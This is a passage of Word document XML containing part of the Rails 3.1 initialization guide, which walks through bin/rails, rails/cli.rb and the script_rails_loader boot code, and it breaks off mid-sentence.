          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1060" w:anchor="2-40" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/action_dispatch.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3B4954E0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1061" w:anchor="2-41" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activemodel/lib/active_model.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="0749E4E1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1062" w:anchor="2-42" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/active_support/i18n.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="38DE3480" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1063" w:anchor="2-43" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Back to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/action_dispatch.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="3F90E525" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1064" w:anchor="2-44" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Back to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activesupport/lib/action_dispatch/railtie.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="34B3A3B2" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1065" w:anchor="2-45" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Back to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>railties/lib/rails.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6A9BA2AD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1066" w:anchor="2-46" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Back to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>railties/lib/rails/all.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="6FBCBDD5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1067" w:anchor="2-47" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activerecord/lib/active_record/railtie.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="36CB7F4D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1068" w:anchor="2-48" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activerecord/lib/active_record.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="37DF8E9B" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1069" w:anchor="2-49" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="a3"/>
          </w:rPr>
          <w:t xml:space="preserve">Back to </w:t>
        </w:r>
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>activerecord/lib/active_record/railtie.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="166E9DCA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1070" w:anchor="2-50" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>actionpack/lib/action_controller/railtie.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="2CA7FAD1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="008938C9" w:rsidP="009A002D">
      <w:pPr>
        <w:widowControl/>
        <w:numPr>
          <w:ilvl w:val="1"/>
          <w:numId w:val="356"/>
        </w:numPr>
        <w:spacing w:before="100" w:beforeAutospacing="1" w:after="100" w:afterAutospacing="1"/>
        <w:jc w:val="left"/>
      </w:pPr>
      <w:hyperlink r:id="rId1071" w:anchor="2-51" w:history="1">
        <w:r w:rsidR="009A002D">
          <w:rPr>
            <w:rStyle w:val="HTML"/>
            <w:color w:val="0000FF"/>
            <w:u w:val="single"/>
          </w:rPr>
          <w:t>actionpack/lib/action_view.rb</w:t>
        </w:r>
      </w:hyperlink>
    </w:p>
    <w:p w14:paraId="434DF2C0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This guide goes through every single file, class and method call that is required to boot up the Ruby on Rails stack for a default Rails 3.1 application, explaining each part in detail along the way. For this guide, we will be focusing on how the two most common methods (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> and Passenger) boot a Rails application.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="20668CE3" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>Paths in this guide are relative to Rails or a Rails application unless otherwise specified.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1937B1D7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="3"/>
      </w:pPr>
      <w:r>
        <w:t>1 Launch!</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="08AE42A0" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">As of Rails 3, </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>script/server</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> has become </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails server</w:t>
      </w:r>
      <w:r>
        <w:t>. This was done to centralize all rails related commands to one common file.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="203EAC79" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.1 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>bin/rails</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1F6B6837" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The actual </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> command is kept in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="a7"/>
        </w:rPr>
        <w:t>bin/rails</w:t>
      </w:r>
      <w:r>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblW w:w="0" w:type="auto"/>
        <w:tblCellSpacing w:w="0" w:type="dxa"/>
        <w:tblCellMar>
          <w:left w:w="0" w:type="dxa"/>
          <w:right w:w="0" w:type="dxa"/>
        </w:tblCellMar>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="8160"/>
      </w:tblGrid>
      <w:tr w:rsidR="009A002D" w14:paraId="28E56D28" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7689B9AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>#!/usr/bin/env ruby</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1CA52ECA" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0800C87D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>begin</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="2118135E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require "rails/cli"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="33ABBA37" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>rescue</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>LoadError</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5E13AB3E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  railties_path = File.expand_path('../../railties/lib', __FILE__)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="339D4C81" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  $:.unshift(railties_path)</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="348CC8AE" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require "rails/cli"</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="17FB908F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="04995BA5" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">This file will attempt to load </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/cli</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">. If it cannot find it then </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> is added to the load path (</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>$:</w:t>
      </w:r>
      <w:r>
        <w:t>) before retrying.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0A5D80B1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="4"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">1.2 </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/cli.rb</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="401EBF2C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t>This file looks like this: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84F597C" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="7698CFA6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rbconfig'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="5F631D3F" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/script_rails_loader'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7865E328" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="77C87D99" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># If we are inside a Rails application this method performs an exec and thus</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61875163" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t># the rest of this script is not run.</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1F4A3815" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails::ScriptRailsLoader.exec_script_rails!</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7D562D6E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6E19D0D1" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'rails/ruby_version_check'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="6F6CC581" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Signal.trap("INT") { puts; exit }</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3AE1CF23" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03D45380" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>if</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ARGV.first == 'plugin'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="03940A8E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  ARGV.shift</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="61658DC6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require 'rails/commands/plugin_new'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0FFCDADF" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>else</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="72654CBD" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  require 'rails/commands/application'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="333DE38D" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4728CBE7" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rbconfig</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file from the Ruby standard library provides us with the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RbConfig</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> class which contains detailed information about the Ruby environment, including how Ruby was compiled. We can see this in use in </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>railties/lib/rails/script_rails_loader</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3CE8E880" w14:textId="77777777" w:rsidTr="009A002D">
        <w:trPr>
          <w:tblCellSpacing w:w="0" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="0" w:type="auto"/>
            <w:vAlign w:val="center"/>
            <w:hideMark/>
          </w:tcPr>
          <w:p w14:paraId="03233F4E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>require 'pathname'</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="7A403367" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="0C00ECBC" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>Rails</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1A86AB83" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  module</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>ScriptRailsLoader</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="3B6E7172" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    RUBY</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= File.join(*RbConfig::CONFIG.values_at("bindir", "ruby_install_name")) + RbConfig::CONFIG["EXEEXT"]</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="1702E660" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    SCRIPT_RAILS</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve"> </w:t>
            </w:r>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>= File.join('script', 'rails')</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="654CC10C" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>    ...</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4C96D0D6" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:t> </w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="50D675A9" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>  end</w:t>
            </w:r>
          </w:p>
          <w:p w14:paraId="4E6CBF04" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
            <w:pPr>
              <w:rPr>
                <w:rFonts w:ascii="SimSun" w:eastAsia="SimSun" w:hAnsi="SimSun" w:cs="SimSun"/>
                <w:sz w:val="24"/>
                <w:szCs w:val="24"/>
              </w:rPr>
            </w:pPr>
            <w:r>
              <w:rPr>
                <w:rStyle w:val="HTML0"/>
              </w:rPr>
              <w:t>end</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="4E2C4D7E" w14:textId="77777777" w:rsidR="009A002D" w:rsidRDefault="009A002D" w:rsidP="009A002D">
      <w:pPr>
        <w:pStyle w:val="a6"/>
      </w:pPr>
      <w:r>
        <w:t xml:space="preserve">The </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>rails/script_rails_loader</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> file uses </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rStyle w:val="HTML"/>
        </w:rPr>
        <w:t>RbConfig::Config</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> to obtain the </w:t>
      </w:r>
      <w:r>
        <w:rPr>
